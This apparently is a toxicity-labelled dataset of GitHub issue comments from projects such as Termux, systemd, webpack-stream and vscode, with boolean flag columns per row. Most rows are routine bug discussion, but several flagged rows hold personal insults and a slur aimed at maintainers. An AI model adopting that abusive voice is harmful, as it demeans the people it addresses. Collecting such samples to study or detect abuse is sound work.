system_tests/ros2/56/148218906,Related to my other comment ( I would think testing the functionality of the core functionality is enough. For the syntactic sugar API a simple test checking that a specific signature works would be enough. ,False,True,False,system_tests/ros2/56
system_tests/ros2/56/148225603,"Ok I simplified the test to just creating a subscription. The tests passed locally, so I won't run another CI. ",False,True,False,system_tests/ros2/56
systemd/systemd/3162/152057115,Follow-up for #3152. ,False,True,False,systemd/systemd/3162
systemd/systemd/3162/216065118,"looks pretty good to me, but let's please invert the two boolean functions! ",False,True,False,systemd/systemd/3162
systemd/systemd/3162/216082793,Force pushed. ,False,True,False,systemd/systemd/3162
systemd/systemd/3162/216147612,"Patch looks good to me. Now, the question is whether to turn the internal implementation of the may_alias and may_instance calls around, and make them a blacklist after all... i.e. whether to change this to ",False,True,False,systemd/systemd/3162
systemd/systemd/3162/216147996,"i'd be happy to merge it like this, or with the whitelist converted into a blacklist, it's up to you... ",False,True,False,systemd/systemd/3162
systemd/systemd/3162/216316459,I think internally it's better to whitelist. At least for me it makes easier to look at the list. ,False,True,False,systemd/systemd/3162
tabulator/olifolkerd/1756/403198087,"Tabulator v4.1.4 Describe the bug I have a table that users are performing data entry. One of the fields is UserID. When the user enters a computing ID the cellEdited event is triggered and it makes a call to the server to lookup the rest of the information if the UserID exists. Pretty standard. If the user entering the data types in the UserID and presses 'Enter' or clicks on the next cell everything works fine. When they press 'Tab' to move to the next cell they get an unhandled exception and the data doesn't update. This is only happening on Chrome. Tabulator Info  Which version of Tabulator are you using? Post a copy of your construct object if possible so we can see how your table is setup  To Reproduce Steps to reproduce the behavior  Create a table with data entry cells (input type) Have one of the cells call out to the server and load the row with data when it gets filled. Enter data that will trigger a row fill Press 'Enter' to confirm everything is working Repeat step 3, then press 'Tab'  and see the error.  Expected behavior I expect the cellEdited callback to work the same regardless of how the user exits the cell. Tab is the most efficient way to make your way across a row of data when entering values. Desktop  Windows 10 Chrome 71.0.3578.98 (Official Build) (64-bit) = ERROR FireFox 64.0.2 = SUCCESS Edge (Microsoft Edge 44.17763.1.0) = SUCCESS  Odd, its usually Chrome that always works and everything else that is broken. This is only used internally by my team, so thankfully I do not have to support IE11... my app doesn't work on that at all. Sadly, everyone wants to use Chrome (can you blame them?) so I need to get this resolved. Error Details ",False,True,False,tabulator/olifolkerd/1756
tabulator/olifolkerd/1756/458323955,"Hey @friend Sorry for the delayed response, I have been busy working on the 4.2 release for next week Thanks for the info. Please could you create a JS Fiddle or code pen that replicates the issue, it is quite hard to find the cause of the issue without a working example. Cheers Oli ) ",False,True,False,tabulator/olifolkerd/1756
taurus/taurus-org/137/189136621,"Hi, The QPixmapWidget (or any derivate like QLed or TaurusLed) alignment property doesn't work from Qt designer. However, code like this would work pixmap_widget.setAlignment(Qt.Qt.AlignHCenter)  this is because qt designer is doing something like alignment = Qt.Qt.ALignment(Qt.Qt.AlignHCenter) pixmap_widget.setAlignment(Qt.Qt.AlignHCenter) alignment = Qt.Qt.AlignLeft  The alignment is being passed by reference. An internal copy of the received aligment in QPixmapWidget.setAlignment should solve the problem. Reported by tiagocoutinho (  ) ",False,True,False,taurus/taurus-org/137
taurus/taurus-org/137/260361012," Description has changed  Diff  --- old +++ new @@ -7,7 +7,7 @@   this is because qt designer is doing something like  -    alignment = Qt.Qt.QALignment(Qt.Qt.AlignHCenter) +    alignment = Qt.Qt.ALignment(Qt.Qt.AlignHCenter)      pixmap_widget.setAlignment(Qt.Qt.AlignHCenter)      alignment = Qt.Qt.AlignLeft  Original comment by tiagocoutinho (",False,True,False,taurus/taurus-org/137
taurus/taurus-org/137/260361015,Ticket moved from /p/sardana/tickets/319/ Can't be converted  _category taurus-qt  Original comment by tiagocoutinho (,False,True,False,taurus/taurus-org/137
taurus/taurus-org/137/260361013, status waiting ♢ resolved  Original comment by cpascual (,False,True,False,taurus/taurus-org/137
taurus/taurus-org/137/260361014,patch sent by Tiago applied to develop Original comment by cpascual (,False,True,False,taurus/taurus-org/137
termux-packages/termux/2735/350404058,"Termux users are running into many newly arisen errors such as 1) ""startarch"" missing  Issues on aarch64  Permission Denied when creating symlink to ca-certificate  ""TermuxArch warning Script signal 1 generated! ""  appears to be something wrong with Termux busybox tar at present  this in any way related to similar changes in  outcomes are identical. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412869675,@friend  then uncomment  comment out  . Busybox tar does not complete untarring as expected; See referenced issues above. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412865898,"""startarch"" missing sdrausty/TermuxArch#104 Issues on aarch64 sdrausty/TermuxArch#105 Permission Denied when creating symlink to ca-certificate sdrausty/termux-archlinux#11 ""TermuxArch warning Script signal 1 generated! "" sdrausty/termux-archlinux#12  @friend Can you post exact steps to reproduce a problem with ""busybox tar"" instead of posting links to various issues whose problem may have a different source ? Or we should debug TermuxArch to find where problem occurs ? For me, at least, there no problem with command  that you posted  So there some possibility that TermuxArch script is faulty or your user did something wrong. Busybox has a relation to ecj or java ? That's something new for me... ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412872318,"@friend Exact command - is a command without a script, for example . I posted result of executing  above  Command is identical to specified in your script ( is identical to ). Where incomplete ? In your script maybe. But running standalone command successfully ends without any error. Okay, I will check your TermuxArch script as you suggested, but I'm 97% sure that there no problem with busybox's tar. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412878919,"@friend I did this, but I don't have any problems...  Successful installation   Successul execution of 'startarch'    Ok, there signal 1 generated, but are you sure that it is from tar ? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412879894,@friend a little info about machine is requested.  Are you using the latest Termux packages? ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412880058,"Yes, latest packages. Machine AArch64, Android 8.0. About  - i try to found where it occurs. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412895023,"@friend this might trigger the error.  And if so, why only with Termux busybox tar? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412889016,"When  is used, there is no signal 1 generated. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412901974,TermuxArch was reinstalled successfully 1.     3.  ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412893686,@friend I just removed your 'spinner' from 'preproot' function and error disappeared. I'm currently doing a verification installation of TermuxArch - if error fixed i will post screenshots. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412904319,"There may be a some kind of 'race condition' since you running a tar job in background.  - this may be a trigger, i'will try to remove output redirection and see what will happen. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412909872,"Thanks for the update, a race condition... @friend Can you post a snippet of how you redirect ouput to find out more? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412909986,@friend The source of error is  ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412910767,The problem is that . ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412912547,"Just to summarize  works without issues as shown on screenshot  assumes that source of several errors in TermuxArch is  without proper debugging.  Perhaps we shouldn't accept issues that occurs in third-party project or those, which does not have a proper PoC to reproduce errors/bugs. (Templates are solution ?)   ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412926725,"I do not assume anything @friend To continue this line of debugging Termux  should be checked;  and system  behave well.  Termux  behaved well until recently, just like . How shall Termux grow if issues regarding Termux Packages cannot be brought up here? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412941252,"@friend I checked it in the first my post in this issue ! You didn't see ? Busybox tar even don't print errors and exited with status 0. Nothing that command  has exit status 0 which means success ? I don't see TermuxArch in termux-packages repo and never seen. It also don't available in main repos via  and don't mentioned as project of Termux organisation ( from third-party packages shouldn't be posted here (in termux-packages). For these we have a Google+ page and Gitter. =============================== @friend I guess this issue can be closed, we can reopen it later if  really has a bug. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412947852,@friend  Package request termux-arch was closed; Are there valid reasons for it to become a package? Then why does it trigger a signal when the others do not? ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412948537,@friend bsdtar triggers signal aswell for me =) This error happens randomly. There two possible situations that may happen in your code  tar finishes before  this will fail since job 1 does not exist  tar finishes after  this will finish without error   Remember don't run parallel shell processes if you don't know how to properly control them. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412951318,I cannot use it.  Neither can Termux users that want to try TermuxArch.  BuildAPKs is in a similar state with the latest Termux Package ecj. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412954228,"Random errors in Termux are very concerning; This is not the first report. This IS not the case with , and this was NOT the case with Termux busybox tar until last week when things broke; See initial post. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412960091,"@friend  - By looking at this I'm very unsure that you properly test your scripts... Some posts above you wrote that this is not in case with . But bsdtar still produce the same behaviour as busybox's tar. I have finished... No more posts from me in this thread. I point you from where error comes - but you ignore, ok... ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/412966086,"@friend thank you for your time in this matter.  Your insight and instructions are appreciated.  There are no errors with bsdtar.  Just like there were none with Termux busybox tar until recently.  As I have mentioned before, your opinions of me are yours.  It would be great to hear a compliment rather than complaint from you btw. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413014953,"@friend I am looking at this matter closer thanks to our discussion. It appears that even on the device throwing random errors,  consistently work verses Termux  BusyBox .  I shall be looking in why this occurs in more detail… ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413116500,Closing then since there's no problem with termux's busybox tar. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413254541,"For those of us who would like to continuare  Termux  triggers signal 1 of these three options; Any ideas why?  I have heard the point about , this is un'importante. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413257852,"For those of us who would like to continuare  is a quicker way to check this than cloning the entire repository.  Only Termux  triggers signal 1 of these three options (Termux ,  and Android system ); Any ideas why? I have heard the point about $? in spinner(), this is un'importante… ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413295173,,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413325427,I must disagree with your biased hair raising conclusion; Sorry to dissent. I disagree ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413326016,"Pardon my English @friend, what you wrote is bullshit. ",True,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413326468,I would like to know the answer to this straightforward question. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413327160,I must disagree with your biased hair raising conclusions; Sorry to dissent. I disagree with your opinions wholeheartedly. ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413329366,"I must disagree with your biased hair raising conclusions; Sorry to dissent. I disagree with your opinions wholeheartedly (learn to punctuation properly, then maybe we can talk). ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413330573,Does anyone have any idea why just Termux busybox tar generates signal 1? ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413337357,@friend study initial post;  many users have posted this error to us.  Why do you promote the Wikipedia article only to delete? ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413338513,"@friend you have asked me to promote Termux at Wikipedia, and you delete our efforts at Google+!  Why? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413343542,,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413343773,Is this (Termux projects fail) what you want @friend? ,False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413345439,"Is this (Termux projects like   and  fail completely) what you want @friend?  I cannot work with people (groups) that entice me to contribute it (worse; wot submission), then delete; Sorry. ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413346420,"How is your PhD coming @friend?  You asked me to promote Termux at Wikipedia, only to delete our efforts.  Why did you do this @friend? (Answer is not forthcoming afais) ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413356569,"@friend You reacted with a laugh emoji; Is contributing to Termux only to see your contributions deleted (run afoul), really funny as you stated with your laughing emoji? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413358276,"@friend You reacted with a laugh emoji; Is contributing to Termux only to see your contributions deleted (run afoul) really as funny as you stated with your laughing emoji?  Both  and  are down with the latest Termux updates.  This is not funny @friend.  It's a headache for me to keep these projects running while I get, ""broken because it's NOT Termux"" from you and our PhD candidate. ",True,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413360303,"@friend You reacted with a laugh emoji; Is contributing to Termux only to see your contributions deleted (run afoul) really as funny as you stated with your laughing emoji? Both  and  are down with the latest Termux updates.  This is not funny @friend.  It's a headache for me to keep these projects running while I get, ""broken because it's NOT Termux"" from you and our PhD candidate @friend who, btw, enticed me to contribute to Termux @ Wikipedia, only to delete our mutual group effort to promote Termux worldwide.  Why did you do this @friend? ",False,True,False,termux-packages/termux/2735
termux-packages/termux/2735/413361146,"Straightforward question to @friend, probably without reply.  Can someone answer why they encourage something only to delete it? ",False,True,False,termux-packages/termux/2735
tern-lint/angelozerr/39/104445877,"@friend I understand your problem. At first I have forked tern angular from marijnh/tern  tern/plugin/angular.js #L405 for AngularJS Eclipse  to improve it and to get list of directives, controller. See  problem is because tern doesn't provide the capability to declare several type for the same function. I think to resolve this problem a custom !lint should be developped for angular. It was in my scope to do that. I must just find time to do that. ",False,True,False,tern-lint/angelozerr/39
tern-lint/angelozerr/39/104669090,"@friend, thanks for the additional information (and confirmation about typing in marijnh/tern). I just wanted to make sure that the issue was reported. I think I can workaround most of this for now by removing the DI Arrays from my source code and add a build step to put them back before minification / mangling. ",False,True,False,tern-lint/angelozerr/39
tern-lint/angelozerr/39/131267570,@friend I'm workinh on again about my fork of tern angular. I have created the project at  and I'm writing tests (I would like to have a lot of tests). I think your lint problem is not difficult to fix it. It should be really cool if you could create an issues per problem (with a sample) at  will fix it. After that you will able to copy/paste  in your tern/plugin/angular.js I have the attention to contribute to official tern plugin with my fork. ,False,True,False,tern-lint/angelozerr/39
tern-lint/angelozerr/39/131275384,@friend fix was very easy  (multi parameter) ,False,True,False,tern-lint/angelozerr/39
tern-lint/angelozerr/39/79039986,When using both the  and the  plugins for  and using strict dependency injection I get warnings about invalid parameters. Example code I get the following linter warning Not sure if this is an issue with the  plugin or the  plugin or both. I found the  type info in the  plugin here  marijnh/tern  tern/plugin/angular.js #L405  It would be nice if we could figure out a way to make functions with more than one signature work properly though. I can't really use the  plugin for any of my large projects until this works. ,False,True,False,tern-lint/angelozerr/39
tickettest1/kbower/2770/268486805,"rneville trac comment on Dec 24, 2015, 65049 AM Clearly this was handled long ago.... ",False,True,False,tickettest1/kbower/2770
tracks/TracksApp/1155/36495941,"Migrated from the original issue at  have not tested with more than 2 notes though. Browsers Chrome 12, FF4 ",False,True,False,tracks/TracksApp/1155
travis-ci/travis-ci/6976/193612027,"i have a spec folder that i'm trying to split in half to take advantage of travis' parallel build matrix. instead creating 2 folders, i'm trying to use  and bash to split the folder up. my travis.yml has these sections and my script looks like this in my log, i see that's spitting out the correct spec files.. but rspec seems to be running without the env variables. both jobs are just running the full rspec features folder. is this just a syntax issue? i know travis doesn't like multiple lines in the  section, but i thought putting it all in a bash would help. ",False,True,False,travis-ci/travis-ci/6976
tickettest1/kbower/2770/268486806,"rneville trac status change on Dec 24, 2015, 65049 AM closed ",False,True,False,tickettest1/kbower/2770
tickettest1/kbower/2770/268486809,"kbower trac comment on Feb 4, 2016, 32448 AM [5421] ",False,True,False,tickettest1/kbower/2770
travis-ci/travis-ci/6976/265187435,"should be exported before  is executed and sets  value inside the script.  is empty when the execution gets to . If you want to set  at the time of execution, you need to be a bit cleverer. For example, you might want to try ",False,True,False,travis-ci/travis-ci/6976
think/top-think/840/412482281,"ThinkPHP 5 is an open-sourced project, it is a successor to ThinkPHP 3.2, inspired by Laravel, Symfony, and other popular PHP MVC frameworks. There's so many similar PHP projects that are inspired by modular programming, and also coded under the PSR standards, I don't think they are plagiarism, especially their codes have so many difference to each other. Just reinvent the wheel if you don't like this one, blame does not help. This is one of the rules for open-source. ",False,True,False,think/top-think/840
travis-ci/travis-ci/6976/265228201,"thanks for the response @friend !  hmm.. i think i'm misunderstanding how/where the export is supposed to work. is  getting emptied in the matrix stage? should i be using a global variable?  are you suggesting using the  like this? this one makes sense to me, but it also didnt work / ",False,True,False,travis-ci/travis-ci/6976
tickettest1/kbower/2770/196895257,"Imported from trac ticket 2770. Created by aadams Opened in trac May 31, 2014, 70502 PM Last modified in trac Feb 4, 2016, 32448 AM  by aadams Trying to void tickets 0505401CQ41 and 0430401CB96...receiving the following error message. Please help! Need to void these 2 tickets and about 10 more before month end closeout tonight. [cidimage001.png@friend.269B9CA0] [[Image(image001.png)]]   aadams attached image001.png on May 31, 2014, 70502 PM  ",False,True,False,tickettest1/kbower/2770
travis-ci/travis-ci/6976/265248846,"Ah, you are right.  doesn't work, either. You'll have to set  after  is set. And I don't think that is possible with the  key. ",False,True,False,travis-ci/travis-ci/6976
travis-ci/travis-ci/6976/265837460,"Set up a build matrix with an intermediate environment variable, then based on that, set  in the script itself. yaml env  GROUP=1 GROUP=2 travis.sh`  I'm closing this now. ",False,True,False,travis-ci/travis-ci/6976
tutorials/ElenaShadskaja/4072/365477477,Tutorial issue found  Your tutorial was not created on the site. Please ensure there is an experience tag among the assigned tags. Affected server DEV GREEN ,False,True,False,tutorials/ElenaShadskaja/4072
tweakCompatible/jlippold/89371/450384565,,False,True,False,tweakCompatible/jlippold/89371
tweakCompatible/jlippold/89371/497394170,"This issue is being closed because your review was accepted into the tweakCompatible website.  Tweak developers do not monitor or fix issues submitted via this repo. If you have an issue with a tweak, contact the developer via another method. ",False,True,False,tweakCompatible/jlippold/89371
twitter-refresh/andrewjkerr/7/49814904,"Instead of having a pop-up, it might be worth looking into just greying out the icon when refreshing is disabled and lighting the icon back up when refreshing is enabled. ",False,True,False,twitter-refresh/andrewjkerr/7
ursa/quartzjer/73/55798577,"../src/ursaNative.cc219 warning ‘void getArgDataAndLength(int)’ defined but not used ../src/ursaNative.cc234 warning ‘char getArg1BufferAsString(int)’ defined but not used ../src/ursaNative.cc287 warning ‘bool getArgInt(int)’ defined but not used ../src/ursaNative.cc308 warning ‘RSA generateKey(int, long unsigned int)’ defined but not used make ** [Release/obj.target/ursaNative/src/ursaNative.o] Error 1 make Leaving directory makenode-gyp configure &amp;&amp; node-gyp build &amp;&amp; node install.js` npm ERR! Exit status 1 npm ERR! npm ERR! Failed at the ursa@friend.8.1 install script. npm ERR! This is most likely a problem with the ursa package, npm ERR! not with npm itself. npm ERR! Tell the author that this fails on your system npm ERR!     node-gyp configure &amp;&amp; node-gyp build &amp;&amp; node install.js npm ERR! You can get their info via npm ERR!     npm owner ls ursa npm ERR! There is likely additional logging output above. help ( ",False,True,False,ursa/quartzjer/73
ursa/quartzjer/73/74267620,"@friend now that this landed, could you try the newest version just updated today to see if the new build system fixes it for you? ",False,True,False,ursa/quartzjer/73
ursa/quartzjer/73/74277073,I can confirm that this is working on io.js v1.2.0 ,False,True,False,ursa/quartzjer/73
vagrant-riak-cluster/hectcastro/2/13026556,This pull request adds support for Riak Control via a wrapper cookbook for the riak cookbook. The main purpose of the wrapper cookbook is to generate SSL certificates for Riak Control. ,False,True,False,vagrant-riak-cluster/hectcastro/2
viewer-sinatra/everypolitician/2550/125740207,Commits  Germany Refresh from upstream changes Refresh countries.json  ,False,True,False,viewer-sinatra/everypolitician/2550
viewer-sinatra/everypolitician/2550/170215233,I've updated DATASOURCE on master ,False,True,False,viewer-sinatra/everypolitician/2550
vscode/Microsoft/14668/185961652," scroll a line towards the top of the screen invoke signature help and intellisense 🐛 signature help shows below intellisense  &lt;img width=""685"" alt=""screen shot 2016-10-28 at 18 07 25"" src=""",False,True,False,vscode/Microsoft/14668
vscode/Microsoft/14668/257238166,"What's the expected behaviour here? One solution would be to render the hover on top of the suggest. The other, to be aware of multiple widgets and just lay them out in ways that they don't overlap. ",False,True,False,vscode/Microsoft/14668
vscode/Microsoft/14668/257245347,"Yeah, I would always keep the above, below layout when both widgets show ",False,True,False,vscode/Microsoft/14668
vscode/Microsoft/14668/323556468,Just got hit by this. I thought there was something wrong with my language server. O ,False,True,False,vscode/Microsoft/14668
vscode/Microsoft/14668/346637490,"To keep the number of issues in our inbox on a manageable level, we're closing issues that have been on the backlog for a long time but haven't gained traction We look at the number of votes the issue has received and the number of duplicates issues filed. Thanks for your understanding. Happy coding! ",False,True,False,vscode/Microsoft/14668
vsts-dotnet-samples/Microsoft/171/363486573,When we go to  there is  on the page which does not exist. Can we delete it and given another helpful link ,False,True,False,vsts-dotnet-samples/Microsoft/171
vsts-dotnet-samples/Microsoft/171/428387729,Yeah we made some changes to the url's here. I will get this fixed ,False,True,False,vsts-dotnet-samples/Microsoft/171
vue-virtual-scroller/Akryum/98/431625389,"It does. Again, it does. That's right! Like in the demo! Incredible. Maybe next time you don't understand how to use a library, ask questions and help improve documentation instead of just saying the author is lying to you. ",False,True,False,vue-virtual-scroller/Akryum/98
vue-virtual-scroller/Akryum/98/372225007,"So, I was looking for a virtual scroller type component, and i found this. Demos appear to show exactly what someone needs when looking for a virtual scroller, but after using it you realise that it's not. Why? Because it doesn't work with variable heights, even tho it says that it does.  In reality it doesn't because you still need to provide the height one way or another. And most, if not all real-world use cases involve variable heights! The dynamic scroller is supposed to work without defined heights, but it doesn't because it will show the list items scaled to min-item-height, so it's useless. I understand that computing the actual CSS height is not effective because of performance reasons, but then why lie about what you can and cannot do? The only way to implement a scroller with variable-height items, is to implement the scrollbar as well and use the list length as reference for the list height and scrollbar handle, instead of the item heights. Sure it won't be perfect but it's way better then computing css heights, or having fixed heights that leave spaces of different sizes, depending on the device you are browsing on. ",False,True,False,vue-virtual-scroller/Akryum/98
web-cse440-au15/uwcse440/105/160806330,You're submitting this from . See my email regarding using a feature branch. I'll close this pending another submission from a feature branch. ,False,True,False,web-cse440-au15/uwcse440/105
webpack-stream/shama/199/347244050,"Since version 5.0.0, when gulp starts a task, webpack is starting as usual, saying it's watching for a changes, but whenever the file is changed, the webpack does nothing like not detecting any changes. 4.03 works fine. Passing different versions of webpack is not making any difference. ",False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410133917,I recommend searching this issue tracker or git history for the individuals who added the dual watch thing and ping them to ask. Or get real specific with a repro of the issue as it relates to this library as I don't use gulp. ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410724648,NOT WORK! ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410623852,Same issue here. ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410779875,Sometimes I repost comments if I don't think they are being read. ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410772144,@friend i think its double post   😢 ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410769071,I recommend searching this issue tracker or git history for the individuals who added the dual watch thing and ping them to ask. Or get real specific with a repro of the issue as it relates to this library as I don't use gulp. ,False,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410837474,I thought that this first post of yours @friend was stupid.. but that last one just shows how retarded you are ,True,True,False,webpack-stream/shama/199
webpack-stream/shama/199/410855562,Thank you for making me write free code for you so enjoyable! ,False,True,False,webpack-stream/shama/199
windowsserverdocs/MicrosoftDocs/1615/428420730,"Hi @friend, We do actually have quite a lot of on-premises documentation. We're sorry you didn't find what you were looking for specifically. We can address your concerns better when you reference the particular documentation that’s not meeting your needs. Thanks, Corey ",False,True,False,windowsserverdocs/MicrosoftDocs/1615
witcher3map/witcher3map/84/159321467,"Using this option would hide monsters, points of interest, side quests, anything else? ",False,True,False,witcher3map/witcher3map/84
wpml-page-builders-gutenberg/OnTheGoSystems/44/495257457,@friend/wpml review please! ,False,True,False,wpml-page-builders-gutenberg/OnTheGoSystems/44
witcher3map/witcher3map/84/224806971,This probably needs to added to the search results too. ,False,True,False,witcher3map/witcher3map/84
windowsserverdocs/MicrosoftDocs/1023/334755524,"Try to upgrade a GPT/EUFI hardrive to an SSD... Good luck, as MS, and SSD vendors don't even bother to try to offer solutions. Here's a new idea for a rare problem, that makes basic drive upgrades for hundreds of millions a high pain in the butt, while others exploit the OS in disturbing new ways.  Inconvenience consumers who attempt to upgrade storage and there is NO support to facilitate such a basic endeavor. Change for the better is great, but without a path for those who can't afford to throw away everything and but your latest project (which soon will be hyjacked-we know)  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 8cfb6a8b-c7e5-1bf6-0c24-2757871e9d07 Version Independent ID da5ffb60-d0c8-7117-02fe-7a3fd33169ac Content Change a Master Boot Record (MBR) into a GUID partition table (GPT) disk Content Source WindowsServerDocs/storage/disk-management/change-an-mbr-disk-into-a-gpt-disk.md Product windows-server-threshold GitHub Login @friend Microsoft Alias jgerend  ",True,True,False,windowsserverdocs/MicrosoftDocs/1023
windowsserverdocs/MicrosoftDocs/1615/368037517,"Not only does your on-prem software comes without documentation, and the links you remember to put within the apps aren't even for a direct resource, you still go on to hawking on and on Azure and go on without documenting how stuff is done with the undocumented bloat we pay thousands for.  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 428e9e07-ca35-27d2-e63a-92930cec0118 Version Independent ID 9a452a85-9afa-42d5-f319-bf1c4c50d01d Content Remote Desktop Services architecture Content Source WindowsServerDocs/remote/remote-desktop-services/Desktop-hosting-logical-architecture.md Product windows-server-threshold GitHub Login @friend Microsoft Alias elizapo  ",True,True,False,windowsserverdocs/MicrosoftDocs/1615
xregexp/slevithan/146/173217872,"When using the g flag, the result does appear as an array (as compared to the regular result), but only contains a single element with the first actual match. When forEach is used, all matches are properly detected. ",False,True,False,xregexp/slevithan/146
test/tcatche/234/246223309,"&lt;blockquote&gt; &lt;p&gt;The combineReducers helper function turns an object whose values are different reducing functions into a single reducing function you can pass to createStore.&lt;/p&gt; &lt;/blockquote&gt; &lt;h2 id=""接口""&gt;&lt;a href=""#接口"" class=""headerlink"" title=""接口""&gt;&lt;/a&gt;接口&lt;/h2&gt;&lt;blockquote&gt; &lt;p&gt;combineReducers(reducers)&lt;/p&gt; &lt;/blockquote&gt; &lt;ul&gt; &lt;li&gt;&lt;strong&gt;reducers (Object)&lt;/strong&gt; &lt;code&gt;reducers&lt;/code&gt; 是一个对象，它的值对应要混合的各个 reducer 。&lt;/li&gt; &lt;li&gt;&lt;strong&gt;return (Function)&lt;/strong&gt; 多个独立的 &lt;code&gt;reducer&lt;/code&gt; 合并后的最终的 &lt;code&gt;finalReducers&lt;/code&gt;， 这个 &lt;code&gt;finalReducers&lt;/code&gt; 的签名和 &lt;code&gt;reducer&lt;/code&gt; 一样，接收 state 和action 做为参数，然后调用 &lt;strong&gt;所有 reducer 处理 action&lt;/strong&gt; ，并把各个 reducer 处理 state 结果合成最终的新的 state ，并且返回的 state 的结构和传入的 reducers 参数对象的结构一致。&lt;/li&gt; &lt;/ul&gt; &lt;h2 id=""分析""&gt;&lt;a href=""#分析"" class=""headerlink"" title=""分析""&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;当应用复杂起来以后，必然要对 reducer 进行拆分，否则全部放在一起的 reducer 难以维护。&lt;br&gt;而拆分后的 reducer 负责维护一部分的 state。&lt;/p&gt; &lt;p&gt;&lt;code&gt;combineReducers&lt;/code&gt; 的作用就是把多个 reducer 的函数合并成一个最终的 reducer 函数，然后就可以使用这个函数管理 store，先看个示例：&lt;/p&gt; &lt;figure class=""highlight js""&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=""code""&gt;&lt;pre&gt;&lt;div class=""line""&gt;&lt;span class=""comment""&gt;//将 reducer 拆分成两个：&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;const&lt;/span&gt; todoReducer = &lt;span class=""function""&gt;(&lt;span class=""params""&gt;state = [], action&lt;/span&gt;) =&gt;&lt;/span&gt; &#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;switch&lt;/span&gt; (action.type) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;case&lt;/span&gt; &lt;span class=""string""&gt;'ADD_TODO'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;return&lt;/span&gt; state.concat([action.text])&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;default&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;return&lt;/span&gt; state&lt;/div&gt;&lt;div class=""line""&gt;    &#125;&lt;/div&gt;&lt;div class=""line""&gt;&#125;&lt;/div&gt;&lt;div class=""line""&gt;&lt;/div&gt;&lt;div class=""line""&gt;&lt;span class=""keyword""&gt;const&lt;/span&gt; counterReducer = &lt;span class=""function""&gt;(&lt;span class=""params""&gt;state = &lt;span class=""number""&gt;0&lt;/span&gt;, action&lt;/span&gt;) =&gt;&lt;/span&gt; &#123;&lt;/div&gt;&lt;div class=""line""&gt;  &lt;span class=""keyword""&gt;switch&lt;/span&gt; (action.type) &#123;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;case&lt;/span&gt; &lt;span class=""string""&gt;'INCREMENT'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;return&lt;/span&gt; state + &lt;span class=""number""&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;case&lt;/span&gt; &lt;span class=""string""&gt;'DECREMENT'&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;return&lt;/span&gt; state - &lt;span class=""number""&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;    &lt;span class=""keyword""&gt;default&lt;/span&gt;&lt;/div&gt;&lt;div class=""line""&gt;      &lt;span class=""keyword""&gt;return&lt;/span&gt; 